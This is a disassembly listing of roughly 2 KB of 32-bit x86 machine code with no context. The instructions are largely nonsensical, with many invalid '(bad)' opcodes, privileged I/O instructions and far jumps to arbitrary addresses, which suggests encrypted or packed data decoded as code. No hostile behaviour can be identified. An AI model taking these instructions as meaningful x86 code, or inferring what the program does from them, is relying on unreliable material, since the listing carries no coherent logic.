  4071ba:	xlat   BYTE PTR ds:[ebx]
  4071bb:	or     edi,ebx
  4071bd:	(bad)  
  4071be:	jmp    0xedde:0xea03e405
  4071c5:	call   0xe112329b
  4071ca:	hlt    
  4071cb:	lods   al,BYTE PTR ds:[esi]
  4071cc:	out    dx,al
  4071cd:	mov    edx,0xd0c5ccb6
  4071d2:	hlt    
  4071d3:	xlat   BYTE PTR ds:[ebx]
  4071d4:	repnz add dl,ah
  4071d7:	in     eax,0xbd
  4071d9:	ret    
  4071da:	fdivp  st(1),st
  4071dc:	idiv   DWORD PTR [esi+0x5c8cf05]
  4071e2:	repz (bad) 
  4071e4:	mov    edi,0xe0c8cbf1
  4071e9:	mov    cl,0xbb
  4071eb:	retf   0xe9b4
  4071ee:	sar    DWORD PTR [edx-0x5132d35],1
  4071f4:	iret   
  4071f5:	int3   
  4071f6:	loop   0x4071cc
  4071f8:	int    0xd3
  4071fa:	aam    0xf2
  4071fc:	shl    esi,0xc7
  4071ff:	call   0xed056bd8
  407204:	ret    
  407205:	mov    ebp,0xe6e6c5a9
  40720a:	out    dx,al
  40720b:	mov    bh,0xf9
  40720d:	fmul   st,st(1)
  40720f:	mov    esi,0xedd8f7fd
  407214:	(bad)  
  407216:	(bad)  
  407217:	add    al,BYTE PTR [esi]
  407219:	repnz mov DWORD PTR [edi],0xecbe7c5
  407220:	fild   DWORD PTR [esi]
  407222:	or     al,ah
  407224:	repnz shl dl,0xcd
  407228:	scas   eax,DWORD PTR es:[edi]
  407229:	in     al,dx
  40722a:	mov    ah,0xf9
  40722c:	aad    0xf6
  40722e:	(bad)  
  407230:	mov    edi,0xf8ecb4eb
  407235:	repz mov edi,0xfcf301db
  40723b:	shl    dl,1
  40723d:	rol    DWORD PTR [edx],0xe4
  407240:	fcmovu st,st(1)
  407242:	fdivr  st,st(2)
  407244:	mov    esi,0xbcc2e6c3
  407249:	ret    0xe7cb
  40724c:	fidivr DWORD PTR [ecx-0x122f0b08]
  407252:	stc    
  407253:	(bad)  
  407255:	cli    
  407256:	cmc    
  407257:	clc    
  407258:	rol    DWORD PTR [edi],1
  40725a:	std    
  40725b:	aam    0x1
  40725d:	fadd   st,st(0)
  40725f:	into   
  407260:	or     al,0xe6
  407262:	add    eax,0xefa6f2fd
  407267:	lock iret 
  407269:	shl    DWORD PTR [ecx-0xa360936],0xcc
  407270:	iret   
  407271:	(bad)  
  407272:	cli    
  407273:	aam    0xf1
  407275:	fcmovne st,st(6)
  407277:	out    0xdb,al
  407279:	(bad)  
  40727c:	jmp    0x407280
  40727e:	hlt    
  40727f:	stc    
  407280:	retf   
  407281:	sti    
  407282:	in     eax,dx
  407283:	in     al,0xa9
  407285:	jmp    0xf3c1:0xace9b2dd
  40728c:	(bad)
  40728f:	clc    
  407290:	fdiv   st,st(0)
  407292:	enter  0xc9cf,0xf5
  407296:	mov    ch,0xfd
  407298:	fidivr DWORD PTR [edx-0x824090b]
  40729e:	leave  
  40729f:	out    0x1,eax
  4072a1:	or     eax,esp
  4072a3:	dec    ah
  4072a5:	mov    ebx,0xb5e7b2b0
  4072ab:	call   0xfff739a9
  4072b0:	repnz aam 0xed
  4072b3:	fcmovb st,st(2)
  4072b5:	in     eax,dx
  4072b6:	in     eax,dx
  4072b7:	fdivp  st(4),st
  4072b9:	test   cl,0xe4
  4072bc:	les    ecx,FWORD PTR [eax]
  4072be:	in     eax,0xe7
  4072c0:	fmul   st,st(0)
  4072c2:	loopne 0x4072b0
  4072c4:	mov    bl,0xe2
  4072c6:	sar    DWORD PTR [ebp-0x32281e49],1
  4072cc:	mov    al,0xe4
  4072ce:	mov    eax,0xc3ddbbf0
  4072d3:	loop   0x407298
  4072d5:	shl    ch,1
  4072d7:	(bad)  
  4072d8:	sti    
  4072d9:	jmp    0x4072c1
  4072db:	shl    dh,1
  4072dd:	inc    BYTE PTR [edi]
  4072df:	mov    esp,0xfc508ff
  4072e4:	leave  
  4072e5:	ret    0xd5b7
  4072e8:	lock mov bh,0xb6
  4072eb:	fcmovne st,st(7)
  4072ed:	fnstcw WORD PTR [ebx-0x17162313]
  4072f3:	leave  
  4072f4:	repz out 0xff,eax
  4072f7:	lock fcmovu st,st(2)
  4072fa:	add    bh,bl
  4072fc:	shl    dl,0xea
  4072ff:	add    al,0x0
  407301:	cld    
  407302:	out    0x13,eax
  407304:	loope  0x4072ce
  407306:	loop   0x4072b5
  407308:	out    dx,eax
  407309:	loop   0x4072d9
  40730b:	ret    0xf1e5
  40730e:	icebp  
  40730f:	icebp  
  407310:	fucomi st,st(4)
  407312:	mov    ch,0xb8
  407314:	icebp  
  407315:	aad    0xc0
  407317:	add    cl,bh
  407319:	(bad)  
  40731b:	loop   0x4072de
  40731d:	loopne 0x4072dc
  40731f:	cmc    
  407320:	add    al,0xe
  407322:	add    ah,ah
  407324:	repz test al,0xb1
  407327:	repz jmp 0x4072dc
  40732a:	jmp    0xcfb5:0xd7d9cee4
  407331:	mov    esi,0xd8efd4
  407336:	stc    
  407337:	(bad)  
  407339:	fdivr  st(6),st
  40733b:	fmul   QWORD PTR [edx]
  40733d:	fdivp  st(2),st
  40733f:	enter  0xfdee,0x7
  407343:	rcr    dh,cl
  407345:	enter  0xafd1,0xf4
  407349:	sti    
  40734a:	leave  
  40734b:	in     al,dx
  40734c:	mov    al,0xdf
  40734e:	lods   eax,DWORD PTR ds:[esi]
  40734f:	cli    
  407350:	(bad)  
  407352:	hlt    
  407353:	mov    al,0xfb
  407355:	out    dx,al
  407356:	repnz sar bh,1
  407359:	jecxz  0x407358
  40735b:	xlat   BYTE PTR ds:[ebx]
  40735c:	out    0xdd,eax
  40735e:	out    dx,eax
  40735f:	fndisi(8087 only) 
  407361:	jecxz  0x407336
  407363:	or     eax,0xcde1d1c3
  407368:	call   0xc9254f40
  40736d:	(bad)  
  40736e:	out    0xd2,eax
  407370:	fnstsw WORD PTR [ecx-0x12274f06]
  407376:	mov    ecx,0xe4e4f2cc
  40737b:	or     edx,esp
  40737d:	cli    
  40737e:	fsubr  st(3),st
  407380:	out    0xcd,eax
  407382:	(bad)  
  407383:	adc    dh,BYTE PTR [ebx-0x2a15413e]
  407389:	jmp    0x407372
  40738b:	mov    cl,0xca
  40738d:	mov    eax,0xd1ddf9b0
  407392:	out    dx,al
  407393:	into   
  407394:	(bad)  
  407395:	mov    edi,0xc1d4b4bd
  40739a:	mul    edx
  40739c:	retf   0xc4d7
  40739f:	fld    st(7)
  4073a1:	into   
  4073a2:	int3   
  4073a3:	fxch   st(3)
  4073a5:	xlat   BYTE PTR ds:[ebx]
  4073a6:	jecxz  0x407374
  4073a8:	lds    esi,FWORD PTR [esi-0x3f351a0f]
  4073ae:	mov    ebx,0xdeedeee5
  4073b3:	clc    
  4073b4:	int3   
  4073b5:	sti    
  4073b6:	aad    0xf6
  4073b8:	(bad)  
  4073ba:	cli    
  4073bb:	push   es
  4073bc:	fdivrp st(6),st
  4073be:	add    esi,eax
  4073c0:	push   es
  4073c1:	(bad)  
  4073c2:	loopne 0x407392
  4073c4:	scas   eax,DWORD PTR es:[edi]
  4073c5:	in     al,0xf6
  4073c7:	mov    bh,0xed
  4073c9:	shl    esp,1
  4073cb:	repz repz in al,dx
  4073ce:	icebp  
  4073cf:	(bad)  
  4073d1:	xlat   BYTE PTR ds:[ebx]
  4073d2:	mov    ebp,0xff01e1d6
  4073d7:	(bad)  
  4073d9:	ret    0xdf07
  4073dc:	clc    
  4073dd:	add    BYTE PTR ds:0xef90cef,al
  4073e3:	push   es
  4073e4:	jmp    0xb7b0:0xcdc9c0ad
  4073eb:	cli    
  4073ec:	cli    
  4073ed:	cli    
  4073ee:	hlt    
  4073ef:	call   0xe90e61b3
  4073f4:	repz hlt 
  4073f6:	out    dx,al
  4073f7:	int    0xf5
  4073f9:	pop    es
  4073fa:	(bad)  
  4073fc:	(bad)  
  4073fd:	(bad)  
  4073ff:	retf   
  407400:	int    0x6
  407402:	inc    BYTE PTR [edx]
  407404:	out    dx,al
  407405:	jecxz  0x4073f4
  407407:	enter  0xc5b5,0xf0
  40740b:	leave  
  40740c:	clc    
  40740d:	mov    dh,0xf7
  40740f:	in     al,dx
  407410:	xlat   BYTE PTR ds:[ebx]
  407411:	mov    dh,0xdc
  407413:	jmp    0x1f6:0xf3bff302
  40741a:	aam    0xe6
  40741c:	clc    
  40741d:	or     esp,ebp
  40741f:	fld    DWORD PTR [ebx+esi*8]
  407422:	cld    
  407423:	out    dx,al
  407424:	fxch   st(0)
  407426:	jmp    0xd1d3:0xc1cfb3b1
  40742d:	mov    ecx,0xf2eecfad
  407432:	mov    ah,0xda
  407434:	mov    edx,0xd302d1bf
  407439:	(bad)  
  40743a:	or     dh,cl
  40743c:	idiv   bh
  40743e:	(bad)  
  40743f:	(bad)  
  407440:	enter  0xadb,0x7
  407444:	shl    cl,1
  407446:	loop   0x40740e
  407448:	icebp  
  407449:	shr    edi,0xe8
  40744c:	mov    ch,0xc8
  40744e:	lods   eax,DWORD PTR ds:[esi]
  40744f:	mov    ebx,0xbcd8f1b4
  407454:	std    
  407455:	ret    
  407456:	out    dx,al
  407457:	into   
  407458:	repz add al,0x3
  40745b:	out    0xe4,al
  40745d:	jmp    0x51e3c6a
  407462:	call   0xb213526e
  407467:	mov    esp,0xf4f0b4d6
  40746c:	hlt    
  40746d:	rol    ah,0xb4
  407470:	dec    dh
  407472:	add    edi,DWORD PTR [ebp-0x25384938]
  407478:	(bad)  
  40747a:	mov    ebp,0xf0503de
  40747f:	mov    esp,0xfac8dee0
  407484:	(bad)
  407487:	in     eax,dx
  407488:	iret   
  407489:	repnz (bad) 
  40748b:	hlt    
  40748c:	in     eax,0xd6
  40748e:	in     eax,dx
  40748f:	mov    ch,0xfc
  407491:	repz sti 
  407493:	mov    ebx,0xedd0d1ff
  407498:	ret    0xeb03
  40749b:	pop    es
  40749c:	or     edx,ebx
  40749e:	(bad)  
  40749f:	aad    0xde
  4074a1:	add    ah,ah
  4074a3:	push   cs
  4074a4:	jecxz  0x40748d
  4074a6:	retf   
  4074a7:	(bad)  
  4074a9:	mov    dl,0xb1
  4074ab:	mov    bl,0xcb
  4074ad:	mov    eax,0xbeebe4cb
  4074b2:	cmc    
  4074b3:	mov    esi,0xc7f1b6e9
  4074b8:	clc    
  4074b9:	in     al,dx
  4074ba:	xlat   BYTE PTR ds:[ebx]
  4074bb:	or     ebx,ecx
  4074bd:	or     ecx,DWORD PTR [ebx]
  4074bf:	push   es
  4074c0:	retf   
  4074c1:	loopne 0x4074d1
  4074c3:	retf   
  4074c4:	call   0xacf3407b
  4074c9:	(bad)
  4074cc:	clc    
  4074cd:	mov    eax,0xb4d3ffdf
  4074d2:	mov    eax,0xe6beddb8
  4074d7:	loop   0x4074c0
  4074d9:	repnz fcmovb st,st(0)
  4074dc:	icebp  
  4074dd:	leave  
  4074de:	add    al,0xc9
  4074e0:	(bad)  
  4074e1:	cli    
  4074e2:	in     al,0xe9
  4074e4:	(bad)  
  4074e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074e7:	loopne 0x4074b8
  4074e9:	mov    ch,0xb5
  4074eb:	loope  0x4074e1
  4074ed:	repnz (bad) 
  4074ef:	aad    0xdd
  4074f1:	mov    eax,0xddbad6db
  4074f6:	in     al,dx
  4074f7:	aad    0xe2
  4074f9:	sti    
  4074fa:	out    0xd2,eax
  4074fc:	or     esp,ebx
  4074fe:	jmp    0xff3a4ae5
  407503:	or     ch,BYTE PTR [eax-0x12511c4e]
  407509:	fucomi st,st(1)
  40750b:	repz scas eax,DWORD PTR es:[edi]
  40750d:	ffreep st(6)
  40750f:	mov    ecx,0xd8f3fce8
  407514:	sar    bh,1
  407516:	jecxz  0x407509
  407518:	(bad)  
  407519:	fadd   QWORD PTR [ecx]
  40751b:	fcomp  st(4)
  40751d:	retf   0x7e6
  407520:	in     al,0x6
  407522:	out    dx,al
  407523:	(bad)  
  407524:	out    0xbc,al
  407526:	in     al,0xa8
  407528:	shl    DWORD PTR [edi-0x3a0d372f],1
  40752e:	in     al,0xc5
  407530:	enter  0xf3f4,0xcc
  407534:	ret    
  407535:	int    0xf9
  407537:	(bad)  
  407538:	fmul   st(4),st
  40753a:	in     al,0xfe
  40753c:	rcr    ecx,1
  40753e:	rol    eax,0xf9
  407541:	inc    DWORD PTR [ecx]
  407543:	or     esp,edi
  407545:	faddp  st(0),st
  407547:	call   0xc5166c12
  40754c:	lock in al,dx
  40754e:	mov    al,0xf6
  407550:	into   
  407551:	mov    ebp,0xf9fe02e9
  407556:	shl    eax,cl
  407558:	repz cli 
  40755a:	sti    
  40755b:	in     al,0xa
  40755d:	dec    ebx
  40755f:	aam    0xce
  407561:	cld    
  407562:	add    al,0xe8
  407564:	loop   0x407536
  407566:	lds    esi,FWORD PTR [edi-0x34113133]
  40756c:	enter  0xdafa,0xcf
  407570:	mov    bh,0xea
  407572:	jmp    0x407524
  407574:	jecxz  0x407536
  407576:	into   
  407577:	loop   0x407579
  407579:	shl    dh,1
  40757b:	add    bl,bl
  40757d:	fiadd  WORD PTR [ecx+ecx*8]
  407580:	fild   DWORD PTR [ebx]
  407582:	repz or ebp,DWORD PTR [ecx-0xe2f3712]
  407589:	call   0xc70f5e44
  40758e:	retf   
  40758f:	mov    eax,0xc9b8d6d3
  407594:	(bad)  
  407595:	call   0xbb166a66
  40759a:	out    0xe5,eax
  40759c:	add    ebp,esp
  40759e:	(bad)  
  40759f:	cld    
  4075a0:	(bad)
  4075a3:	call   0xf42d4490
  4075a8:	jmp    0x407590
  4075aa:	jmp    0x407562
  4075ac:	clc    
  4075ad:	stc    
  4075ae:	(bad)  
  4075af:	fcmovne st,st(0)
  4075b1:	cli    
  4075b2:	aam    0xe8
  4075b4:	sti    
  4075b5:	(bad)  
  4075b7:	(bad)  
  4075b9:	bnd jmp 0x407578
  4075bc:	ffreep st(1)
  4075be:	fdiv   st(2),st
  4075c0:	iret   
  4075c1:	fild   DWORD PTR ds:0xc1e8d30a
  4075c7:	ret    0xc4b7
  4075ca:	loopne 0x407596
  4075cc:	(bad)  
  4075cd:	call   0x53aa5
  4075d2:	add    dl,ch
  4075d4:	(bad)  
  4075d5:	test   BYTE PTR [edi],0xd8
  4075d8:	aam    0x1
  4075da:	lock test edi,0xc704e606
  4075e1:	(bad)  
  4075e2:	in     al,dx
  4075e3:	out    dx,eax
  4075e4:	mov    esp,0xf0ebd1cd
  4075e9:	enter  0xdab2,0xe4
  4075ed:	mov    ah,0xe9
  4075ef:	leave  
  4075f0:	dec    bl
  4075f2:	out    dx,al
  4075f3:	mov    eax,0xb8c3f4fa
  4075f8:	(bad)  
  4075f9:	loopne 0x4075ff
  4075fb:	jmp    0xebf8:0xc80102e5
  407602:	shr    ebp,cl
  407604:	mov    esp,0xb2deceeb
  407609:	call   0xf1346ce4
  40760e:	iret   
  40760f:	retf   
  407610:	(bad)  
  407611:	fxch   st(6)
  407613:	mov    ebx,0xdfe0ecbc
  407618:	add    eax,0xf6c2ddd8
  40761d:	(bad)  
  40761f:	add    al,0xc6
  407621:	add    al,0xd
  407623:	adc    DWORD PTR [eax-0x4953405a],edi
  407629:	mov    dl,0xe9
  40762b:	xlat   BYTE PTR ds:[ebx]
  40762c:	out    0xb8,al
  40762e:	in     eax,dx
  40762f:	aad    0xfd
  407631:	(bad)  
  407633:	(bad)  
  407635:	stc    
  407636:	mov    esp,0xf0fae1cc
  40763b:	add    al,0xf6
  40763d:	leave  
  40763e:	sti    
  40763f:	(bad)  
  407640:	invd   
  407642:	invd   
  407644:	(bad)  
  407646:	in     al,dx
  407647:	int3   
  407648:	fdiv   QWORD PTR [ecx-0x130c0649]
  40764e:	(bad)  
  40764f:	fnstsw WORD PTR [esi-0x27034b45]
  407655:	out    0xf2,eax
  407657:	std    
  407658:	add    al,BYTE PTR ds:0xf8dad6c6
  40765e:	add    al,0xcb
  407660:	pop    es
  407661:	retf   0x1fe
  407664:	scas   al,BYTE PTR es:[edi]
  407665:	ret    
  407666:	test   cl,0xc9
  407669:	in     al,0xf2
  40766b:	mov    bh,0xd7
  40766d:	shr    dl,0xd9
  407670:	iret   
  407671:	retf   
  407672:	shl    BYTE PTR [eax-0x24324604],cl
  407678:	(bad)  
  40767a:	(bad)  
  40767b:	out    0xf1,eax
  40767d:	add    ebp,esp
  40767f:	dec    BYTE PTR [esi]
  407681:	fsub   st(5),st
  407683:	fbstp  TBYTE PTR [ecx-0x1e4e3942]
  407689:	jmp    0xd7083e43
  40768e:	div    DWORD PTR [eax-0x50a281c]
  407694:	(bad)  
  407696:	loop   0x407668
  407698:	lock fnop 
  40769b:	jmp    0xdbfc:0xc801c60a
  4076a2:	rcl    ebx,0xea
  4076a5:	loope  0x407687
  4076a7:	in     al,dx
  4076a8:	in     al,0xc8
  4076aa:	vpminsw ymm6,ymm3,YMMWORD PTR [eax-0x41040948]
  4076b2:	in     eax,dx
  4076b3:	iret   
  4076b4:	cli    
  4076b5:	loope  0x40767a
  4076b7:	aad    0x1
  4076b9:	cli    
  4076ba:	cld    
  4076bb:	(bad)  
  4076bc:	fadd   QWORD PTR [edx]
  4076be:	faddp  st(7),st
  4076c0:	cmc    
  4076c1:	out    dx,eax
  4076c2:	repnz retf 0xd0aa
  4076c6:	in     al,dx
  4076c7:	mov    dh,0xca
  4076c9:	in     eax,dx
  4076ca:	out    dx,al
  4076cb:	in     eax,0xb0
  4076cd:	not    ah
  4076cf:	mov    al,0xd9
  4076d1:	fbstp  TBYTE PTR [ecx-0x9230337]
  4076d7:	add    bh,ah
  4076d9:	aad    0x4
  4076db:	(bad)  
  4076dc:	fstp   st(7)
  4076de:	or     eax,DWORD PTR ds:0xe8e60c00
  4076e4:	mov    edi,0xe3ece3af
  4076e9:	loop   0x4076ce
  4076eb:	out    dx,al
  4076ec:	repz in eax,dx
  4076ee:	icebp  
  4076ef:	jmp    0x4076ca
  4076f1:	mov    esp,0xcdfafbb1
  4076f6:	int    0x5
  4076f8:	(bad)  
  4076fa:	push   es
  4076fb:	(bad)  
  4076fc:	fxch   st(1)
  4076fe:	(bad)  
  4076ff:	or     eax,0xe9cfc5d9
  407704:	int    0xe8
  407706:	out    0xc0,al
  407708:	rcl    dh,1
  40770a:	ret    
  40770b:	out    dx,al
  40770c:	mov    ecx,0xe5cdb4f2
  407711:	fnstsw WORD PTR [edi-0xd2b0008]
  407717:	into   
  407718:	aam    0xd9
  40771a:	aam    0xf5
  40771c:	lock aad 0xff
  40771f:	add    edi,ebp
  407721:	(bad)  
  407722:	into   
  407723:	repnz out 0xeb,al
  407726:	int    0xeb
  407728:	loopne 0x40771d
  40772a:	retf   
  40772b:	mov    dh,0xc1
  40772d:	mul    ch
  40772f:	shl    esp,cl
  407731:	(bad)  
  407732:	cmc    
  407733:	repz mov esi,0x2c1cfb6
  407739:	out    0xff,al
  40773b:	fld    st(3)
  40773d:	test   ecx,0x7fb070b
  407743:	bnd ret 
  407745:	jmp    0xe30a63f6
  40774a:	jmp    0xbfe4:0xebb4eed2
  407751:	mov    esi,0xf9d2c3ee
  407756:	hlt    
  407757:	add    al,BYTE PTR [esi]
  407759:	fdivr  st,st(0)
  40775b:	or     bl,bh
  40775d:	add    bh,bl
  40775f:	jmp    0xe5387967
  407764:	mov    bl,0xe9
  407766:	repnz out dx,eax
  407768:	loop   0x40773c
  40776a:	shl    ecx,cl
  40776c:	(bad)  
  40776d:	jmp    0xbfda:0xd1efdbb4
  407774:	sti    
  407775:	add    bl,al
  407777:	icebp  
  407778:	aam    0xe1
  40777a:	aad    0xd7
  40777c:	(bad)  
  40777e:	out    0xdf,eax
  407780:	in     eax,dx
  407781:	aam    0x12
  407783:	fldcw  WORD PTR [ebp-0x35481519]
  407789:	repz int3 
  40778b:	enter  0xc0f3,0xf8
  40778f:	aad    0xe5
  407791:	jecxz  0x407785
  407793:	in     eax,dx
  407794:	(bad)  
  407796:	rcl    dh,cl
  407798:	fcomip st,st(5)
  40779a:	cli    
  40779b:	(bad)  
  40779c:	les    eax,FWORD PTR [ecx]
  40779e:	cmc    
  40779f:	cmc    
  4077a0:	jecxz  0x4077ad
  4077a2:	int3   
  4077a3:	or     eax,0xf1e6d3af
  4077a8:	out    dx,eax
  4077a9:	loop   0x407786
  4077ab:	(bad)  
  4077ac:	mov    bh,0xb8
  4077ae:	cmc    
  4077af:	mov    al,0xb3
  4077b1:	shr    dh,1
  4077b3:	loope  0x4077a4
  4077b5:	aad    0xbf
  4077b7:	shl    eax,cl
  4077b9:	aam    0xb9
  4077bb:	lock mov bh,0xee
  4077bf:	mov    esp,0x13f2ffff
  4077c4:	ret    0xe6ec
  4077c7:	out    dx,eax
  4077c8:	jecxz  0x407780
  4077ca:	sar    bl,0xb5
  4077cd:	int    0xb8
  4077cf:	enter  0xbbfa,0xf6
  4077d3:	out    dx,eax
  4077d4:	stc    
  4077d5:	add    ebp,esp
  4077d7:	add    esi,ecx
  4077d9:	loop   0x4077be
  4077db:	std    
  4077dc:	loope  0x4077ae
  4077de:	add    eax,0x8f3c9de
  4077e3:	or     esp,edi
  4077e5:	ffree  st(4)
  4077e7:	shr    esp,0xe4
  4077ea:	rcl    esi,1
  4077ec:	scas   eax,DWORD PTR es:[edi]
  4077ed:	mov    dl,0xd4
  4077ef:	lods   al,BYTE PTR ds:[esi]
  4077f0:	in     al,dx
  4077f1:	cli    
  4077f2:	out    dx,eax
  4077f3:	jmp    0x23b75b9
  4077f8:	pop    es
  4077f9:	add    eax,edi
  4077fb:	or     esi,esi
  4077fd:	rcl    ch,0xe
  407800:	in     eax,dx
  407801:	fimul  WORD PTR [edi]
  407803:	out    dx,eax
  407804:	retf   0xedc8
  407807:	lods   al,BYTE PTR ds:[esi]
  407808:	stos   DWORD PTR es:[edi],eax
  407809:	stos   BYTE PTR es:[edi],al
  40780a:	mov    ch,0xd3
  40780c:	retf   
  40780d:	out    dx,eax
  40780e:	mov    ah,0xf5
  407810:	mov    dh,0xd3
  407812:	jecxz  0x40780d
  407814:	leave  
  407815:	ret    
  407816:	cli    
  407817:	mov    esp,0xc2df01f5
  40781c:	clc    
  40781d:	fld    QWORD PTR [ebx]
  40781f:	in     eax,0xde
  407821:	in     al,0x12
  407823:	(bad)  
  407825:	lock int 0xee
  407828:	mov    bh,0xcb
  40782a:	in     al,dx
  40782b:	test   al,0xef
  40782d:	mov    cl,0xda
  40782f:	into   
  407830:	(bad)  
  407833:	add    eax,ebp
  407835:	ret    
  407836:	loop   0x40780f
  407838:	in     al,dx
  407839:	add    edx,ecx
  40783b:	out    0xa,al
  40783d:	add    edi,ecx
  40783f:	loopne 0x40783d
  407841:	or     eax,ecx
  407843:	clc    
  407844:	enter  0xacf1,0xbd
  407848:	scas   al,BYTE PTR es:[edi]
  407849:	mov    bh,0xb4
  40784b:	cli    
  40784c:	in     al,0xea
  40784e:	mov    cl,0xb5
  407850:	int3   
  407851:	aad    0xeb
  407853:	sti    
  407854:	jmp    0xe7436b17
  407859:	aad    0xe0
  40785b:	dec    DWORD PTR [ebx]
  40785d:	add    eax,eax
  40785f:	add    al,cl
  407861:	dec    al
  407863:	fmulp  st(1),st
  407865:	mov    ebp,0xb0d1f6e7
  40786a:	(bad)
  40786d:	jmp    0x40785d
  40786f:	mov    eax,0xf8fdeded
  407874:	mov    ebp,0xe4ecc0f5
  407879:	fadd   QWORD PTR [ebx]
  40787b:	or     ecx,edx
  40787d:	retf   0xcec8
  407880:	retf   
  407881:	retf   
  407882:	or     ecx,DWORD PTR [edi]
  407884:	mov    esi,0xeba4b2ac
  407889:	lods   eax,DWORD PTR ds:[esi]
  40788a:	iret   
  40788b:	rcl    bl,0xe6
  40788e:	in     al,0xf6
  407890:	in     al,0xdc
  407892:	jmp    0x407851
  407894:	repz fcos 
  407897:	repz rol BYTE PTR [ecx],cl
  40789a:	mov    esp,0xd809f600
  40789f:	sti    
  4078a0:	ret    
  4078a1:	aam    0x5
  4078a3:	leave  
  4078a4:	int3   
  4078a5:	loopne 0x40788a
  4078a7:	in     al,0xe7
  4078a9:	hlt    
  4078aa:	mov    cl,0xed
  4078ac:	aad    0xe9
  4078ae:	test   esi,0xffced5b8
  4078b4:	cli    
  4078b5:	sar    DWORD PTR [ecx-0x39452219],0xe6
  4078bc:	loopne 0x4078c2
  4078be:	sti    
  4078bf:	in     eax,0xe8
  4078c1:	or     DWORD PTR [ebx],ecx
  4078c3:	adc    ch,ch
  4078c5:	(bad)  
  4078c6:	mov    dl,0xd0
  4078c8:	mov    dh,0xe0
  4078ca:	aad    0xb4
  4078cc:	enter  0xf6b4,0xdf
  4078d0:	fdivr  QWORD PTR [eax-0x222c370a]
  4078d6:	shr    ch,1
  4078d8:	in     eax,0xe5
  4078da:	add    al,0xc3
  4078dc:	or     edi,eax
  4078de:	in     eax,0xe
  4078e0:	add    ah,dl
  4078e2:	ficom  DWORD PTR [ecx]
  4078e4:	scas   al,BYTE PTR es:[edi]
  4078e5:	(bad)  
  4078e6:	mov    bl,0xbe
  4078e8:	icebp  
  4078e9:	rcl    ebp,0xe4
  4078ec:	icebp  
  4078ed:	lds    edi,FWORD PTR [ebx-0x312320a]
  4078f3:	loop   0x4078e1
  4078f5:	ret    
  4078f6:	(bad)  
  4078f7:	std    
  4078f8:	loopne 0x4078ca
  4078fa:	out    0xc5,al
  4078fc:	lds    ecx,FWORD PTR [ebx]
  4078fe:	fsubr  st,st(5)
  407900:	pop    es
  407901:	adc    ecx,DWORD PTR [ebx]
  407903:	out    0xdc,al
  407905:	in     eax,dx
  407906:	retf   0xcbc9
  407909:	repz mov ebx,0xb8edf0d1
  40790f:	fsubp  st(7),st
  407911:	repz mov edi,0xeec2ecf5
  407917:	into   
  407918:	in     eax,0x1
  40791a:	rcl    ecx,1
  40791c:	lds    ecx,FWORD PTR [edi]
  40791e:	push   cs
  40791f:	fld    QWORD PTR [edi]
  407921:	jmp    0xb434440c
  407926:	retf   0xd5d6
  407929:	lods   eax,DWORD PTR ds:[esi]
  40792a:	mov    dh,0xee
  40792c:	in     al,0xce
  40792e:	aad    0xac
  407930:	mov    ch,0xb6
  407932:	call   0x43a7901
  407937:	into   
  407938:	mov    ebx,0xd8ff0106
  40793d:	fcmove st,st(0)
  40793f:	or     dl,ah
  407941:	or     cl,cl
  407943:	sar    DWORD PTR [ecx+eiz*8-0x2d2f3f43],cl
  40794a:	fucomi st,st(3)
  40794c:	mov    dl,0xf4
  40794e:	mov    edi,0xf9eaf2c5
  407953:	add    eax,ebp
  407955:	rcr    dl,0xd0
  407958:	rcl    bl,0xf0
  40795b:	cld    
  40795c:	fcmovb st,st(6)
  40795e:	(bad)  
  407960:	fcmovnu st,st(3)
  407962:	stc    
  407963:	or     al,0xae
  407965:	jmp    0x407952
  407967:	mov    esp,0xb3bbb4e6
  40796c:	iret   
  40796d:	cli    
  40796e:	jmp    0xda175e61
  407973:	in     eax,dx
  407974:	leave  
  407975:	int3   
  407976:	rol    dl,cl
  407978:	neg    ebp
  40797a:	fmul   DWORD PTR [ebx]
  40797c:	cld    
  40797d:	add    edi,ecx
  40797f:	loope  0x407949
  407981:	int3   
  407982:	add    al,al
  407984:	in     eax,0xe5
  407986:	(bad)  
  407988:	int3   
  407989:	jecxz  0x407980
  40798b:	jmp    0xeef7:0xe8d6fab0
  407992:	add    ebx,edx
  407994:	lock rol DWORD PTR [edi],cl
  407997:	(bad)  
  407998:	not    eax
  40799a:	in     al,0xc2
  40799c:	pop    es
  40799d:	sti    
  40799e:	jmp    0xfe286369
  4079a3:	fucomip st,st(6)
  4079a5:	ret    0xbce1
  4079a8:	jmp    0xef063a89
  4079ad:	push   DWORD PTR [eax+esi*4-0xcfd0e28]
  4079b4:	int3   
  4079b5:	mov    edi,0x1fb02dd
  4079ba:	aam    0xc1
  4079bc:	sar    cl,1
  4079be:	clc    
  4079bf:	or     eax,0x2e005df
  4079c4:	mov    eax,0xcfade5b0
  4079c9:	lods   eax,DWORD PTR ds:[esi]
  4079ca:	div    BYTE PTR [edi-0x44472618]
  4079d0:	in     al,dx
  4079d1:	imul   dl
  4079d3:	repz stc 
  4079d5:	fcom   st(2)
  4079d7:	sar    dh,cl
  4079d9:	aam    0xc0
  4079db:	(bad)  
  4079dd:	ret    0xbe1
  4079e0:	cld    
  4079e1:	std    
  4079e2:	loop   0x4079e3
  4079e4:	shl    DWORD PTR [esi-0x4b34430a],cl
  4079ea:	in     al,dx
  4079eb:	ror    eax,1
  4079ed:	mov    bh,0xfb
  4079ef:	out    0xc4,al
  4079f1:	retf   0xceda
  4079f4:	mov    bh,0xf3
  4079f6:	mov    esp,0xd0dafce5
  4079fb:	jecxz  0x4079dd
  4079fd:	loop   0x4079f9
  4079ff:	or     bl,bl
  407a01:	retf   
  407a02:	in     al,0xfd
  407a04:	mov    cl,0xc6
  407a06:	in     eax,dx
  407a07:	mov    bl,0xcd
  407a09:	retf   
  407a0a:	out    0xf0,al
  407a0c:	fucomi st,st(2)
  407a0e:	enter  0xb8f7,0xea
  407a12:	ret    
  407a13:	fcom   st(6)
  407a15:	int3   
  407a16:	(bad)  
  407a18:	fsub   st,st(7)
  407a1a:	mov    ecx,0xe504e3df
  407a1f:	jecxz  0x4079fa
  407a21:	retf   0xc0f9
  407a24:	ret    
  407a25:	out    dx,eax
  407a26:	scas   eax,DWORD PTR es:[edi]
  407a27:	jmp    0xd334491b
  407a2c:	(bad)  
  407a2e:	(bad)
  407a31:	rcl    edi,1
  407a33:	xlat   BYTE PTR ds:[ebx]
  407a34:	lock (bad) 
  407a36:	std    
  407a37:	hlt    
  407a38:	fdivr  st,st(3)
  407a3a:	aam    0xc6
  407a3c:	add    eax,0xfd06d705
  407a41:	(bad)
  407a44:	out    0xee,eax
  407a46:	jmp    0xf4386731
